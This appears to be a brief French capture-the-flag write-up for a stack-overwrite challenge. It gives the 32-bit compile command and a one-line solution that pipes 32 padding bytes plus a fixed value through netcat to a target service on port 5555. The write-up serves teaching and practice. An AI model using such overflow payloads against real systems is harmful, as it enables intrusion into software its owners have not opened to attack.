# Sondage 1

## Objectif du challenge

Le but de ce challenge est de venir modifier une valeur la stack pour obtenir le flag.
 
## Compilation

```sh
gcc pwn1.c -o pwn1 -m32
```

## Résolution

```sh
python2 -c 'print "A"*32 + "\x05\xb0\xd3\xc0"' | nc target 5555
```

